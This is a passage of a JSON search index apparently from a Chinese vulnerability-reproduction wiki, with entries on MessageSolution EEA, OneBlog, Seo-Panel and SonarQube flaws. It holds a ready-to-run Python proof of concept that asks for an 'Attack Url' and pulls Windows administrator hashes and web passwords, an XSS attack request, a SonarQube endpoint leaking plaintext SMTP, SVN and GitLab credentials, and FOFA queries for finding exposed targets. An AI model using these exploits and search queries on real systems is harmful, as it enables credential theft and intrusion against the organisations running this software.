POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/MessageSolution/MessageSolution%20%20%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9FEEA%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CNVD-2021-10543/","text":"MessageSolution \u90ae\u4ef6\u5f52\u6863\u7cfb\u7edfEEA \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e CNVD-2021-10543 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 MessageSolution\u4f01\u4e1a\u90ae\u4ef6\u5f52\u6863\u7ba1\u7406\u7cfb\u7edf EEA\u662f\u5317\u4eac\u6613\u8baf\u601d\u8fbe\u79d1\u6280\u5f00\u53d1\u6709\u9650\u516c\u53f8\u5f00\u53d1\u7684\u4e00\u6b3e\u90ae\u4ef6\u5f52\u6863\u7cfb\u7edf\u3002\u8be5\u7cfb\u7edf\u5b58\u5728\u901a\u7528WEB\u4fe1\u606f\u6cc4\u6f0f\uff0c\u6cc4\u9732Windows\u670d\u52a1\u5668administrator hash\u4e0eweb\u8d26\u53f7\u5bc6\u7801 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] MessageSolution \u4f01\u4e1a\u90ae\u4ef6\u5f52\u6863\u7ba1\u7406\u7cfb\u7edfEEA FOFA \u00b6 [!NOTE] title=\"MessageSolution Enterprise Email Archiving (EEA)\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u9875\u9762\u5982\u4e0b \u8bbf\u95ee\u5982\u4e0bUrl http://xxx.xxx.xxx.xxx/authenticationserverservlet/ \u4f7f\u7528\u83b7\u5f97\u5230\u7684\u5bc6\u7801\u53ef\u4ee5\u767b\u5f55\u7cfb\u7edf \u6f0f\u6d1e\u5229\u7528POC \u00b6 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: MessageSolution \u4f01\u4e1a\u90ae\u4ef6\u5f52\u6863\u7ba1\u7406\u7cfb\u7edfEEA \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/authenticationserverservlet/\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if response . status_code == 200 and \"administrator\" in response . text : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u4fe1\u606f\u6cc4\u9732 \u54cd\u5e94\u4e3a: {} \\033 [0m\" . format ( target_url , response . text )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url )) if __name__ == \"__main__\" : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) Goby & POC \u00b6 [!NOTE] MessageSolution \u90ae\u4ef6\u5f52\u6863\u7cfb\u7edfEEA \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e CNVD-2021-10543 Goby & POC \u5df2\u7ecf\u66f4\u65b0\u5230 Github\u4e2d \u53c2\u8003\u6587\u7ae0 \u00b6 https://mp.weixin.qq.com/s/jehAIIYWrpkLtGvGN-LtFA","title":"MessageSolution  \u90ae\u4ef6\u5f52\u6863\u7cfb\u7edfEEA \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e CNVD-2021-10543"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/MessageSolution/MessageSolution%20%20%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9FEEA%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CNVD-2021-10543/#messagesolution--\u90ae\u4ef6\u5f52\u6863\u7cfb\u7edfeea-\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e-cnvd-2021-10543","text":"","title":"MessageSolution  \u90ae\u4ef6\u5f52\u6863\u7cfb\u7edfEEA \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e CNVD-2021-10543"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/MessageSolution/MessageSolution%20%20%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9FEEA%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CNVD-2021-10543/#\u6f0f\u6d1e\u63cf\u8ff0","text":"MessageSolution\u4f01\u4e1a\u90ae\u4ef6\u5f52\u6863\u7ba1\u7406\u7cfb\u7edf EEA\u662f\u5317\u4eac\u6613\u8baf\u601d\u8fbe\u79d1\u6280\u5f00\u53d1\u6709\u9650\u516c\u53f8\u5f00\u53d1\u7684\u4e00\u6b3e\u90ae\u4ef6\u5f52\u6863\u7cfb\u7edf\u3002\u8be5\u7cfb\u7edf\u5b58\u5728\u901a\u7528WEB\u4fe1\u606f\u6cc4\u6f0f\uff0c\u6cc4\u9732Windows\u670d\u52a1\u5668administrator hash\u4e0eweb\u8d26\u53f7\u5bc6\u7801","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/MessageSolution/MessageSolution%20%20%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9FEEA%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CNVD-2021-10543/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] MessageSolution \u4f01\u4e1a\u90ae\u4ef6\u5f52\u6863\u7ba1\u7406\u7cfb\u7edfEEA","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/MessageSolution/MessageSolution%20%20%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9FEEA%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CNVD-2021-10543/#fofa","text":"[!NOTE] title=\"MessageSolution Enterprise Email Archiving (EEA)\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/MessageSolution/MessageSolution%20%20%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9FEEA%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CNVD-2021-10543/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u9875\u9762\u5982\u4e0b \u8bbf\u95ee\u5982\u4e0bUrl http://xxx.xxx.xxx.xxx/authenticationserverservlet/ \u4f7f\u7528\u83b7\u5f97\u5230\u7684\u5bc6\u7801\u53ef\u4ee5\u767b\u5f55\u7cfb\u7edf","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/MessageSolution/MessageSolution%20%20%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9FEEA%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CNVD-2021-10543/#\u6f0f\u6d1e\u5229\u7528poc","text":"import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: MessageSolution \u4f01\u4e1a\u90ae\u4ef6\u5f52\u6863\u7ba1\u7406\u7cfb\u7edfEEA \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/authenticationserverservlet/\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if response . status_code == 200 and \"administrator\" in response . text : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u4fe1\u606f\u6cc4\u9732 \u54cd\u5e94\u4e3a: {} \\033 [0m\" . format ( target_url , response . text )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url )) if __name__ == \"__main__\" : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/MessageSolution/MessageSolution%20%20%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9FEEA%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CNVD-2021-10543/#goby--poc","text":"[!NOTE] MessageSolution \u90ae\u4ef6\u5f52\u6863\u7cfb\u7edfEEA \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e CNVD-2021-10543 Goby & POC \u5df2\u7ecf\u66f4\u65b0\u5230 Github\u4e2d","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/MessageSolution/MessageSolution%20%20%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9FEEA%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CNVD-2021-10543/#\u53c2\u8003\u6587\u7ae0","text":"https://mp.weixin.qq.com/s/jehAIIYWrpkLtGvGN-LtFA","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/OneBlog/OneBlog%20%E5%B0%8F%E4%BA%8Ev2.2.1%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"OneBlog \u5c0f\u4e8ev2.2.1 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 OneBlog \u5c0f\u4e8ev2.2.1 \u7531\u4e8e\u4f7f\u7528\u542b\u6709\u6f0f\u6d1e\u7248\u672c\u7684Apache Shiro\u548c\u9ed8\u8ba4\u7684\u5bc6\u94a5\u5bfc\u81f4\u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] OneBlog <= v2.2.1 FOFA \u00b6 [!NOTE] app=\"OneBlog\u5f00\u6e90\u535a\u5ba2\u540e\u53f0\u7ba1\u7406\u7cfb\u7edf\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u9646\u9875\u9762\u5982\u4e0b \u4f7f\u7528\u5de5\u5177\u76f4\u63a5\u5229\u7528Apache Shiro\u6f0f\u6d1e\u5373\u53ef","title":"OneBlog \u5c0f\u4e8ev2.2.1 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/OneBlog/OneBlog%20%E5%B0%8F%E4%BA%8Ev2.2.1%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#oneblog-\u5c0f\u4e8ev221-\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e","text":"","title":"OneBlog \u5c0f\u4e8ev2.2.1 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/OneBlog/OneBlog%20%E5%B0%8F%E4%BA%8Ev2.2.1%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"OneBlog \u5c0f\u4e8ev2.2.1 \u7531\u4e8e\u4f7f\u7528\u542b\u6709\u6f0f\u6d1e\u7248\u672c\u7684Apache Shiro\u548c\u9ed8\u8ba4\u7684\u5bc6\u94a5\u5bfc\u81f4\u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/OneBlog/OneBlog%20%E5%B0%8F%E4%BA%8Ev2.2.1%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] OneBlog <= v2.2.1","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/OneBlog/OneBlog%20%E5%B0%8F%E4%BA%8Ev2.2.1%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] app=\"OneBlog\u5f00\u6e90\u535a\u5ba2\u540e\u53f0\u7ba1\u7406\u7cfb\u7edf\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/OneBlog/OneBlog%20%E5%B0%8F%E4%BA%8Ev2.2.1%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u9646\u9875\u9762\u5982\u4e0b \u4f7f\u7528\u5de5\u5177\u76f4\u63a5\u5229\u7528Apache Shiro\u6f0f\u6d1e\u5373\u53ef","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Seo-Panel/Seo-Panel%204.8.0%20%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%20%20CVE-2021-3002/","text":"Seo-Panel 4.8.0 \u53cd\u5c04\u578bXSS\u6f0f\u6d1e CVE-2021-3002 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 *Seo Panel*\u662f\u4e00\u4e2a\u7f51\u7ad9\u641c\u7d22\u5f15\u64ce\u4f18\u5316\u7ba1\u7406\u7684\u5b8c\u6574\u63a7\u5236\u9762\u677f\u3002\u5b83\u5305\u542b\u4e86\u591a\u4e2aSEO\u5de5\u5177\u6765\u589e\u52a0\u548c\u8ddf\u8e2a\u4f60\u7684\u7f51\u7ad9\u6027\u80fd Seo-Panel 4.8.0\u4ee5\u4e0b\u7248\u672c\u5b58\u5728\u8fc7\u6ee4\u4e0d\u5b8c\u5168\u7684\u60c5\u51b5\uff0c\u9020\u6210\u5b58\u5728 \u53cd\u5c04\u578bXSS\u6f0f\u6d1e \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Seo-Panel Version < 4.8.0 \u73af\u5883\u642d\u5efa \u00b6 https://github.com/seopanel/Seo-Panel \u4e0b\u8f7d\u540e\u653e\u5165\u7f51\u7ad9\u6839\u76ee\u5f55\u6839\u636e\u63d0\u793a\u5b89\u88c5\u8bbf\u95ee\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6f0f\u6d1e\u51fa\u73b0\u5728\u627e\u56de\u5bc6\u7801\u9875\u9762 http://xxx.xxx.xxx.xxx/login.php?sec=forgot \u6210\u529f\u5f39\u7a97 ,\u9020\u6210 \u53cd\u5c04\u578bXSS \u6f0f\u6d1e \u6f0f\u6d1ePOC \u00b6 \u8bf7\u6c42\u5305\u5982\u4e0b POST / login . php ? sec = forgot HTTP / 1.1 Host : 192.168.51.133 Content - Length : 118 Pragma : no - cache Cache - Control : no - cache Upgrade - Insecure - Requests : 1 User - Agent : Mozilla / 5.0 ( Windows NT 10.0 ; Win64 ; x64 ) AppleWebKit / 537.36 ( KHTML , like Gecko ) Chrome / 87.0.4280.88 Safari / 537.36 Origin : http : //192.168.51.133 Content - Type : application / x - www - form - urlencoded Accept : text / html , application / xhtml + xml , application / xml ; q = 0.9 , image / avif , image / webp , image / apng , * /*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer : http : //192.168.51.133/login.php?sec=forgot Accept - Encoding : gzip , deflate Accept - Language : zh - CN , zh ; q = 0.9 , en - US ; q = 0.8 , en ; q = 0.7 , zh - TW ; q = 0.6 Cookie : PHPSESSID = i0qk20ehq89b29ct8krpv76vn3 ; yzmphp_adminid = 33 d5DywYQIUGS13SI7x4I0y7JiCacraGcDU1uoBx ; yzmphp_adminname = 1 fc8yAdCyAogZ - PIz4c66dU1ij0mHsG7KGF_5tToVThEzbc Connection : close sec = requestpass & email = peiqi % 40 peiqi . com % 22 % 3 E % 3 Cimg + src % 3 Da + onerror % 3 Dalert % 28 % 22 peiqi % 22 % 29 % 3 Egcuak & code = 12345 & login =","title":"Seo-Panel 4.8.0 \u53cd\u5c04\u578bXSS\u6f0f\u6d1e  CVE-2021-3002"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Seo-Panel/Seo-Panel%204.8.0%20%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%20%20CVE-2021-3002/#seo-panel-480-\u53cd\u5c04\u578bxss\u6f0f\u6d1e--cve-2021-3002","text":"","title":"Seo-Panel 4.8.0 \u53cd\u5c04\u578bXSS\u6f0f\u6d1e  CVE-2021-3002"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Seo-Panel/Seo-Panel%204.8.0%20%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%20%20CVE-2021-3002/#\u6f0f\u6d1e\u63cf\u8ff0","text":"*Seo Panel*\u662f\u4e00\u4e2a\u7f51\u7ad9\u641c\u7d22\u5f15\u64ce\u4f18\u5316\u7ba1\u7406\u7684\u5b8c\u6574\u63a7\u5236\u9762\u677f\u3002\u5b83\u5305\u542b\u4e86\u591a\u4e2aSEO\u5de5\u5177\u6765\u589e\u52a0\u548c\u8ddf\u8e2a\u4f60\u7684\u7f51\u7ad9\u6027\u80fd Seo-Panel 4.8.0\u4ee5\u4e0b\u7248\u672c\u5b58\u5728\u8fc7\u6ee4\u4e0d\u5b8c\u5168\u7684\u60c5\u51b5\uff0c\u9020\u6210\u5b58\u5728 \u53cd\u5c04\u578bXSS\u6f0f\u6d1e","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Seo-Panel/Seo-Panel%204.8.0%20%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%20%20CVE-2021-3002/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Seo-Panel Version < 4.8.0","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Seo-Panel/Seo-Panel%204.8.0%20%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%20%20CVE-2021-3002/#\u73af\u5883\u642d\u5efa","text":"https://github.com/seopanel/Seo-Panel \u4e0b\u8f7d\u540e\u653e\u5165\u7f51\u7ad9\u6839\u76ee\u5f55\u6839\u636e\u63d0\u793a\u5b89\u88c5\u8bbf\u95ee\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Seo-Panel/Seo-Panel%204.8.0%20%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%20%20CVE-2021-3002/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6f0f\u6d1e\u51fa\u73b0\u5728\u627e\u56de\u5bc6\u7801\u9875\u9762 http://xxx.xxx.xxx.xxx/login.php?sec=forgot \u6210\u529f\u5f39\u7a97 ,\u9020\u6210 \u53cd\u5c04\u578bXSS \u6f0f\u6d1e","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Seo-Panel/Seo-Panel%204.8.0%20%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%20%20CVE-2021-3002/#\u6f0f\u6d1epoc","text":"\u8bf7\u6c42\u5305\u5982\u4e0b POST / login . php ? sec = forgot HTTP / 1.1 Host : 192.168.51.133 Content - Length : 118 Pragma : no - cache Cache - Control : no - cache Upgrade - Insecure - Requests : 1 User - Agent : Mozilla / 5.0 ( Windows NT 10.0 ; Win64 ; x64 ) AppleWebKit / 537.36 ( KHTML , like Gecko ) Chrome / 87.0.4280.88 Safari / 537.36 Origin : http : //192.168.51.133 Content - Type : application / x - www - form - urlencoded Accept : text / html , application / xhtml + xml , application / xml ; q = 0.9 , image / avif , image / webp , image / apng , * /*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer : http : //192.168.51.133/login.php?sec=forgot Accept - Encoding : gzip , deflate Accept - Language : zh - CN , zh ; q = 0.9 , en - US ; q = 0.8 , en ; q = 0.7 , zh - TW ; q = 0.6 Cookie : PHPSESSID = i0qk20ehq89b29ct8krpv76vn3 ; yzmphp_adminid = 33 d5DywYQIUGS13SI7x4I0y7JiCacraGcDU1uoBx ; yzmphp_adminname = 1 fc8yAdCyAogZ - PIz4c66dU1ij0mHsG7KGF_5tToVThEzbc Connection : close sec = requestpass & email = peiqi % 40 peiqi . com % 22 % 3 E % 3 Cimg + src % 3 Da + onerror % 3 Dalert % 28 % 22 peiqi % 22 % 29 % 3 Egcuak & code = 12345 & login =","title":"\u6f0f\u6d1ePOC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/SonarQube/SonarQube%20api%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-27986/","text":"SonarQube api \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e CVE-2020-27986 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 SonarQube \u67d0\u63a5\u53e3\u5b58\u5728\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u83b7\u53d6\u90e8\u5206\u654f\u611f\u4fe1\u606f \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] SonarQube FOFA \u00b6 [!NOTE] app=\"sonarQube-\u4ee3\u7801\u7ba1\u7406\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u4e3b\u9875\u5982\u4e0b \u6f0f\u6d1ePOC http://xxx.xxx.xxx.xxx/api/settings/values \u53ef\u6cc4\u9732\u7684\u4e3a\uff1a\u660e\u6587SMTP\u3001SVN\u548cGitlab\u7b49\u654f\u611f\u4fe1\u606f Goby & POC \u00b6 [!NOTE] SonarQube api Information leakage","title":"SonarQube api \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e CVE-2020-27986"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/SonarQube/SonarQube%20api%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-27986/#sonarqube-api-\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e-cve-2020-27986","text":"","title":"SonarQube api \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e CVE-2020-27986"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/SonarQube/SonarQube%20api%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-27986/#\u6f0f\u6d1e\u63cf\u8ff0","text":"SonarQube \u67d0\u63a5\u53e3\u5b58\u5728\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u83b7\u53d6\u90e8\u5206\u654f\u611f\u4fe1\u606f","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/SonarQube/SonarQube%20api%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-27986/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] SonarQube","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/SonarQube/SonarQube%20api%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-27986/#fofa","text":"[!NOTE] app=\"sonarQube-\u4ee3\u7801\u7ba1\u7406\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/SonarQube/SonarQube%20api%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-27986/#\u6f0f\u6d1e\u590d\u73b0","text":"\u4e3b\u9875\u5982\u4e0b \u6f0f\u6d1ePOC http://xxx.xxx.xxx.xxx/api/settings/values 